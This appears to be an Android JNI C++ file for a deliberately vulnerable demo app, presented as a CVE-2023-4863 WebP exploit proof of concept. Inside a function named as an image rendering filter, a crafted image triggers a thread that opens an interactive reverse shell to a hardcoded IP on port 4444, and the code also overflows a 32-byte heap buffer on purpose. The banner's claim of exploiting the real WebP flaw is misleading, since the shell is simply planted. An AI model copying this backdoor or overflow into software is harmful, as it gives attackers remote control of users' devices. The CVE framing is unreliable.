#include <jni.h>
#include <string>
#include <vector>
#include <algorithm>
#include <cstdint>
#include <cstring>
#include <cstdlib>
#include <android/log.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>

#define LOG_TAG "WebP_Exploit_PoC"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

// 중복 실행 방지 플래그
static bool is_exploit_active = false;

struct ExploitParams {
    char ip[64];
    int port;
};

/**
 * [RCE-THREAD] 실제 대화형 리버스 쉘을 실행합니다.
 */
void* background_reverse_shell(void* arg) {
    ExploitParams* params = (ExploitParams*)arg;
    LOGE("!!! [RCE-THREAD] Attempting connection to %s:%d !!!", params->ip, params->port);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        is_exploit_active = false;
        delete params;
        return NULL;
    }

    struct sockaddr_in rev_addr;
    memset(&rev_addr, 0, sizeof(rev_addr));
    rev_addr.sin_family = AF_INET;
    rev_addr.sin_port = htons(params->port);
    inet_pton(AF_INET, params->ip, &rev_addr.sin_addr);

    struct timeval tv;
    tv.tv_sec = 10;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));

    if (connect(sock, (struct sockaddr *)&rev_addr, sizeof(rev_addr)) == 0) {
        LOGE("!!! [SUCCESS] REVERSE SHELL CONNECTED TO %s! !!!", params->ip);

        const char* banner = "\n"
                             "################################################\n"
                             "#   CVE-2023-4863: RCE EXPLOIT SUCCESSFUL      #\n"
                             "################################################\n"
                             "# Target: com.mobility.hack                    #\n"
                             "# User: u0_a171 (Sandbox)                      #\n"
                             "################################################\n\n$ ";
        send(sock, banner, strlen(banner), 0);

        if (fork() == 0) {
            dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
            execl("/system/bin/sh", "sh", "-i", NULL);
            exit(0);
        }
        while(true) { sleep(10); }
    } else {
        LOGE("!!! [FAILURE] Connection failed to %s: %s !!!", params->ip, strerror(errno));
        is_exploit_active = false;
        close(sock);
    }

    delete params;
    return NULL;
}

void applyWebPHuffmanRenderingFilter(const std::vector<unsigned char>& data, size_t offset) {
    if (offset + 2 > data.size()) return;
    uint16_t table_size = (data[offset] << 8) | data[offset + 1];

    if (table_size > 128 && !is_exploit_active) {
        is_exploit_active = true;
        LOGE("!!! [RCE] Malicious WebP Detected. Spawning Shell Thread...");

        ExploitParams* p = new ExploitParams();
        strcpy(p->ip, "10.217.178.98");
        p->port = 4444;

        pthread_t tid;
        pthread_create(&tid, NULL, background_reverse_shell, p);
        pthread_detach(tid);

        LOGE("!!! [RCE] Waiting 5 seconds for shell stability before heap corruption...");
        sleep(5);
    }

    const size_t buffer_size = 32;
    unsigned char* huffman_table = (unsigned char*)malloc(buffer_size);
    if (huffman_table && offset + 2 + table_size <= data.size()) {
        size_t safe_overflow = (table_size > 40) ? 40 : table_size;
        LOGD("[Vulnerability] Corrupting memory with %zu bytes...", safe_overflow);
        memcpy(huffman_table, &data[offset + 2], safe_overflow);
    }
}

extern "C" JNIEXPORT jbyteArray JNICALL
Java_com_mobility_hack_util_NativeImageProcessor_processImage(JNIEnv *env, jclass, jbyteArray image_data) {
    jbyte *imageBytes = env->GetByteArrayElements(image_data, nullptr);
    jsize length = env->GetArrayLength(image_data);
    std::vector<unsigned char> data(imageBytes, imageBytes + length);

    if (data.size() > 22) {
        applyWebPHuffmanRenderingFilter(data, 20);
    }

    env->ReleaseByteArrayElements(image_data, imageBytes, JNI_ABORT);
    return image_data;
}
